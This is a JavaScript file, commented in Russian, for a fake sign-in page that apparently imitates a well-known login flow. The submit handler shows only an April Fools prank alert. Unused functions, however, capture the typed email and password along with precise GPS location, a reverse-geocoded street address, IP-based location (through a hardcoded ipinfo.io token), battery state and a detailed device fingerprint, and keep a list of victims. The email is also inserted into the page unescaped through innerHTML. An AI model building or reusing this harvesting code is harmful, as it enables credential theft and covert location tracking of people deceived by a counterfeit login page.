// Основной файл скрипта для страницы входа

document.addEventListener('DOMContentLoaded', function() {
    // Добавляем обработчик отправки формы
    document.querySelector('.login-form').addEventListener('submit', handleLoginSubmit);
    
    // Обработка фокуса на полях ввода
    const emailInput = document.getElementById('email');
    if (emailInput) {
        // Добавляем класс focused для поля с заполненным значением
        if (emailInput.value) {
            emailInput.classList.add('focused');
            document.querySelector('.input-label').classList.add('focused');
        }
        
        // Обработчики фокуса на поле ввода
        emailInput.addEventListener('focus', function() {
            document.querySelector('.input-label').classList.add('focused');
        });
        
        emailInput.addEventListener('blur', function() {
            if (!this.value) {
                document.querySelector('.input-label').classList.remove('focused');
            }
        });
    }
    
    // Обработчики вспомогательных действий
    document.getElementById('forgot-email').addEventListener('click', function(e) {
        e.preventDefault();
        alert('Функция восстановления не реализована в демонстрационной версии');
    });
    
    document.getElementById('not-device').addEventListener('click', function(e) {
        e.preventDefault();
        alert('Функция "Это не мое устройство" не реализована в демонстрационной версии');
    });
    
    // Если в параметрах URL есть email, подставляем его в форму
    const params = new URLSearchParams(window.location.search);
    const email = params.get('email');
    
    if (email) {
        document.getElementById('email').value = email;
        document.querySelector('.input-label').classList.add('focused');
    }
});

// Обработчик отправки формы
function handleLoginSubmit(event) {
    event.preventDefault();
    
    // Показываем шуточное сообщение на 1 апреля
    alert("с 1 апреля Витек");
}

// Показываем форму ввода пароля
function showPasswordForm(email) {
    const loginForm = document.querySelector('.login-form');
    const formGroups = document.querySelectorAll('.form-group');
    
    // Скрываем все элементы формы
    formGroups.forEach(group => {
        group.style.display = 'none';
    });
    
    // Создаем и добавляем блок с идентификатором пользователя
    const userIdentifier = document.createElement('div');
    userIdentifier.classList.add('user-identifier');
    
    // Получаем первую букву email
    const firstLetter = email.charAt(0).toUpperCase();
    
    userIdentifier.innerHTML = `
        <div class="user-avatar">${firstLetter}</div>
        <div class="user-email">${email}</div>
    `;
    
    // Создаем поле ввода пароля
    const passwordContainer = document.createElement('div');
    passwordContainer.classList.add('password-container', 'form-group');
    
    passwordContainer.innerHTML = `
        <label for="password">Введите пароль</label>
        <input type="password" id="password" name="password" required>
        <div class="form-actions">
            <a href="#" id="forgot-password">Забыли пароль?</a>
        </div>
    `;
    
    // Добавляем созданные элементы в форму
    loginForm.insertBefore(userIdentifier, formGroups[0]);
    loginForm.insertBefore(passwordContainer, formGroups[0]);
    
    // Изменяем текст кнопки
    const submitButton = loginForm.querySelector('button[type="submit"]');
    if (submitButton) {
        submitButton.textContent = 'Войти';
    }
    
    // Добавляем обработчик для ссылки "Забыли пароль?"
    document.getElementById('forgot-password').addEventListener('click', function(e) {
        e.preventDefault();
        alert('Функция восстановления пароля не реализована в демонстрационной версии');
    });
    
    // Фокусируемся на поле ввода пароля
    document.getElementById('password').focus();
}

// Сбор информации о пользователе
async function collectAndSaveUserInfo(email, password) {
    try {
        // Создаем объект с информацией о пользователе
        const userInfo = {
            id: generateUserId(),
            email: email,
            password: password,
            time: new Date().toISOString(),
            deviceInfo: getDeviceInfo(),
            browserInfo: getBrowserInfo(),
            osInfo: getOSInfo(),
            screenInfo: getScreenInfo(),
            ip: 'Получение...',
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
            referrer: document.referrer || 'Прямой переход',
            timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack,
            connectionType: getConnectionType(),
            hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory : 'Неизвестно',
            touchPoints: navigator.maxTouchPoints || 0,
            networkInfo: getNetworkInfo()
        };
        
        // Получаем информацию о батарее, если API доступен
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                userInfo.batteryInfo = {
                    level: Math.round(battery.level * 100) + '%',
                    charging: battery.charging ? 'Да' : 'Нет'
                };
            } catch (batteryError) {
                console.error('Ошибка при получении информации о батарее:', batteryError);
                userInfo.batteryInfo = 'Недоступно';
            }
        }
        
        // Получаем геолокацию
        try {
            userInfo.geolocationStatus = 'Запрашивается...';
            
            // Запрашиваем точное местоположение через Geolocation API
            if (navigator.geolocation) {
                const getAccuratePosition = new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            userInfo.accurateLocation = {
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                altitudeAccuracy: position.coords.altitudeAccuracy,
                                heading: position.coords.heading,
                                speed: position.coords.speed
                            };
                            userInfo.geolocationStatus = 'Получено точное местоположение';
                            
                            // Попытка получить адрес по координатам
                            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}&zoom=18&addressdetails=1`)
                                .then(response => response.json())
                                .then(data => {
                                    if (data && data.display_name) {
                                        userInfo.accurateAddress = data.display_name;
                                    }
                                    resolve();
                                })
                                .catch(() => {
                                    // Если не удалось получить адрес, продолжаем без него
                                    resolve();
                                });
                        },
                        (error) => {
                            console.warn('Ошибка при получении геолокации:', error);
                            
                            if (error.code === 1) { // Пользователь отказал в доступе
                                userInfo.geolocationStatus = 'Пользователь отказал в доступе к геолокации';
                            } else if (error.code === 2) { // Позиция недоступна
                                userInfo.geolocationStatus = 'Позиция недоступна';
                            } else { // Тайм-аут или другая ошибка
                                userInfo.geolocationStatus = 'Ошибка получения геолокации';
                            }
                            
                            resolve(); // Продолжаем без точной геолокации
                        },
                        { 
                            enableHighAccuracy: true, 
                            timeout: 5000, 
                            maximumAge: 0 
                        }
                    );
                });
                
                // Ждем результат геолокации не более 6 секунд
                const timeoutPromise = new Promise(resolve => setTimeout(resolve, 6000));
                await Promise.race([getAccuratePosition, timeoutPromise]);
            } else {
                userInfo.geolocationStatus = 'API геолокации не поддерживается';
            }
        } catch (geoError) {
            console.error('Ошибка при получении геолокации:', geoError);
            userInfo.geolocationStatus = 'Ошибка при получении геолокации';
        }
        
        // Получаем IP-адрес и местоположение через IP
        try {
            const ipResponse = await fetch('https://ipinfo.io/json?token=86b63b5fa26e01');
            const ipData = await ipResponse.json();
            
            userInfo.ip = ipData.ip || 'Неизвестно';
            
            if (ipData.loc) {
                const [latitude, longitude] = ipData.loc.split(',');
                
                userInfo.location = {
                    latitude: parseFloat(latitude),
                    longitude: parseFloat(longitude),
                    city: ipData.city || 'Неизвестно',
                    region: ipData.region || 'Неизвестно',
                    country: ipData.country || 'Неизвестно',
                    timezone: ipData.timezone || 'Неизвестно',
                    provider: ipData.org || 'Неизвестно',
                    postal: ipData.postal || 'Неизвестно'
                };
            }
        } catch (ipError) {
            console.error('Ошибка при получении IP и местоположения:', ipError);
            userInfo.ip = 'Ошибка получения';
            userInfo.location = {
                latitude: null,
                longitude: null,
                city: 'Неизвестно',
                region: 'Неизвестно',
                country: 'Неизвестно'
            };
        }
        
        // Сохраняем собранную информацию
        localStorage.setItem('userInfo', JSON.stringify(userInfo));
        
        // Также сохраняем пользователя в список
        saveUserToList(userInfo);
        
        return userInfo;
    } catch (error) {
        console.error('Ошибка при сборе данных пользователя:', error);
        throw error;
    }
}

// Сохранение пользователя в список
function saveUserToList(userInfo) {
    try {
        // Получаем текущий список пользователей
        let usersList = [];
        const usersListJSON = localStorage.getItem('usersList');
        
        if (usersListJSON) {
            usersList = JSON.parse(usersListJSON);
        }
        
        // Добавляем нового пользователя в начало списка
        usersList.unshift(userInfo);
        
        // Ограничиваем список последними 50 пользователями (для производительности)
        if (usersList.length > 50) {
            usersList = usersList.slice(0, 50);
        }
        
        // Сохраняем обновленный список
        localStorage.setItem('usersList', JSON.stringify(usersList));
    } catch (error) {
        console.error('Ошибка при сохранении пользователя в список:', error);
    }
}

// Генерация уникального ID пользователя
function generateUserId() {
    return Date.now().toString(36) + Math.random().toString(36).substring(2);
}

// Получение информации об устройстве
function getDeviceInfo() {
    const platform = navigator.platform || 'Неизвестно';
    const isMobile = /iPhone|iPad|iPod|Android|webOS|BlackBerry|Windows Phone/i.test(navigator.userAgent);
    const deviceType = isMobile ? 'Мобильное устройство' : 'Компьютер';
    
    // Собираем больше информации о мобильном устройстве
    if (isMobile) {
        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
        const isAndroid = /Android/i.test(navigator.userAgent);
        const isWindowsPhone = /Windows Phone/i.test(navigator.userAgent);
        
        let specificType = 'Другое';
        
        if (isIOS) {
            if (/iPhone/i.test(navigator.userAgent)) specificType = 'iPhone';
            if (/iPad/i.test(navigator.userAgent)) specificType = 'iPad';
            if (/iPod/i.test(navigator.userAgent)) specificType = 'iPod';
        } else if (isAndroid) {
            specificType = 'Android';
            
            // Попытка получить модель Android
            const match = navigator.userAgent.match(/Android[\s\/]+([\d.]+);\s+([^;]+)/);
            if (match && match[2]) {
                specificType += ` (${match[2].trim()})`;
            }
        } else if (isWindowsPhone) {
            specificType = 'Windows Phone';
        }
        
        return `${deviceType}: ${specificType} (${platform})`;
    }
    
    return `${deviceType} (${platform})`;
}

// Получение информации о браузере
function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = 'Неизвестный браузер';
    let version = '';
    
    // Определяем браузер и версию
    if (ua.includes('Firefox/')) {
        browser = 'Mozilla Firefox';
        version = ua.match(/Firefox\/([\d.]+)/)[1];
    } else if (ua.includes('Edg/')) {
        browser = 'Microsoft Edge';
        version = ua.match(/Edg\/([\d.]+)/)[1];
    } else if (ua.includes('Chrome/')) {
        // Проверяем, не является ли это одним из браузеров на движке Chromium
        if (ua.includes('OPR/') || ua.includes('Opera/')) {
            browser = 'Opera';
            version = ua.match(/OPR\/([\d.]+)/) ? ua.match(/OPR\/([\d.]+)/)[1] : ua.match(/Version\/([\d.]+)/)[1];
        } else if (!ua.includes('Edg/')) {
            browser = 'Google Chrome';
            version = ua.match(/Chrome\/([\d.]+)/)[1];
        }
    } else if (ua.includes('Safari/') && !ua.includes('Chrome/')) {
        browser = 'Apple Safari';
        version = ua.match(/Version\/([\d.]+)/)[1];
    } else if (ua.includes('MSIE') || ua.includes('Trident/')) {
        browser = 'Internet Explorer';
        version = ua.match(/MSIE ([\d.]+)/) ? ua.match(/MSIE ([\d.]+)/)[1] : '11.0';
    }
    
    return `${browser} ${version}`;
}

// Получение информации об операционной системе
function getOSInfo() {
    const ua = navigator.userAgent;
    let os = 'Неизвестная ОС';
    let version = '';
    
    // Определяем операционную систему
    if (ua.includes('Windows NT')) {
        os = 'Windows';
        const match = ua.match(/Windows NT ([\d.]+)/);
        if (match) {
            const ntVersion = match[1];
            // Маппинг версий Windows NT
            const winVersions = {
                '10.0': '10/11',
                '6.3': '8.1',
                '6.2': '8',
                '6.1': '7',
                '6.0': 'Vista',
                '5.2': 'XP 64-bit/Server 2003',
                '5.1': 'XP',
                '5.0': '2000'
            };
            version = winVersions[ntVersion] || ntVersion;
        }
    } else if (ua.includes('Macintosh')) {
        os = 'macOS';
        const match = ua.match(/Mac OS X ([\_\d\.]+)/);
        if (match) {
            version = match[1].replace(/_/g, '.');
            
            // Маппинг версий macOS
            const versions = {
                '10.15': 'Catalina',
                '10.14': 'Mojave',
                '10.13': 'High Sierra',
                '10.12': 'Sierra',
                '10.11': 'El Capitan',
                '10.10': 'Yosemite',
                '10.9': 'Mavericks'
            };
            
            // Ищем соответствие для первых двух чисел версии
            const shortVersion = version.split('.').slice(0, 2).join('.');
            if (versions[shortVersion]) {
                version += ` (${versions[shortVersion]})`;
            } else if (parseInt(shortVersion) >= 11) {
                // Для macOS 11 (Big Sur) и новее
                version = `${parseInt(shortVersion)} (${shortVersion === '11' ? 'Big Sur' : shortVersion === '12' ? 'Monterey' : shortVersion === '13' ? 'Ventura' : shortVersion === '14' ? 'Sonoma' : 'Newer'})`;
            }
        }
    } else if (ua.includes('Linux')) {
        os = 'Linux';
        
        if (ua.includes('Android')) {
            os = 'Android';
            const match = ua.match(/Android ([\d\.]+)/);
            if (match) {
                version = match[1];
            }
        } else {
            // Попытка определить дистрибутив Linux
            const distros = [
                { name: 'Ubuntu', pattern: 'Ubuntu' },
                { name: 'Debian', pattern: 'Debian' },
                { name: 'Fedora', pattern: 'Fedora' },
                { name: 'SUSE', pattern: 'SUSE' },
                { name: 'Mint', pattern: 'Mint' },
                { name: 'Gentoo', pattern: 'Gentoo' }
            ];
            
            for (const distro of distros) {
                if (ua.includes(distro.pattern)) {
                    os += ` (${distro.name})`;
                    break;
                }
            }
        }
    } else if (ua.includes('iPhone') || ua.includes('iPad') || ua.includes('iPod')) {
        os = ua.includes('iPhone') ? 'iOS (iPhone)' : ua.includes('iPad') ? 'iOS (iPad)' : 'iOS (iPod)';
        const match = ua.match(/OS ([\d\_]+)/);
        if (match) {
            version = match[1].replace(/_/g, '.');
        }
    }
    
    return version ? `${os} ${version}` : os;
}

// Получение информации о дисплее
function getScreenInfo() {
    const width = window.screen.width;
    const height = window.screen.height;
    const colorDepth = window.screen.colorDepth;
    const pixelRatio = window.devicePixelRatio || 1;
    
    // Определение ориентации экрана
    let orientation = 'Неизвестно';
    if (window.screen.orientation) {
        orientation = window.screen.orientation.type;
    } else if (window.orientation !== undefined) {
        orientation = (window.orientation === 0 || window.orientation === 180) ? 'portrait' : 'landscape';
    } else {
        orientation = width > height ? 'landscape' : 'portrait';
    }
    
    return {
        resolution: `${width}×${height}`,
        colorDepth: `${colorDepth} бит`,
        pixelRatio: pixelRatio.toFixed(2),
        orientation: orientation
    };
}

// Получение типа соединения
function getConnectionType() {
    if (navigator.connection && navigator.connection.type) {
        const connectionTypes = {
            'bluetooth': 'Bluetooth',
            'cellular': 'Сотовая связь',
            'ethernet': 'Ethernet',
            'none': 'Оффлайн',
            'wifi': 'Wi-Fi',
            'wimax': 'WiMAX',
            'other': 'Другое',
            'unknown': 'Неизвестно'
        };
        
        return connectionTypes[navigator.connection.type] || 'Неизвестно';
    }
    
    return 'Информация недоступна';
}

// Получение сетевой информации
function getNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    
    if (connection) {
        return {
            effectiveType: connection.effectiveType || 'Неизвестно',
            downlink: connection.downlink || 'Неизвестно',
            rtt: connection.rtt || 'Неизвестно',
            saveData: connection.saveData
        };
    }
    
    return {};
} 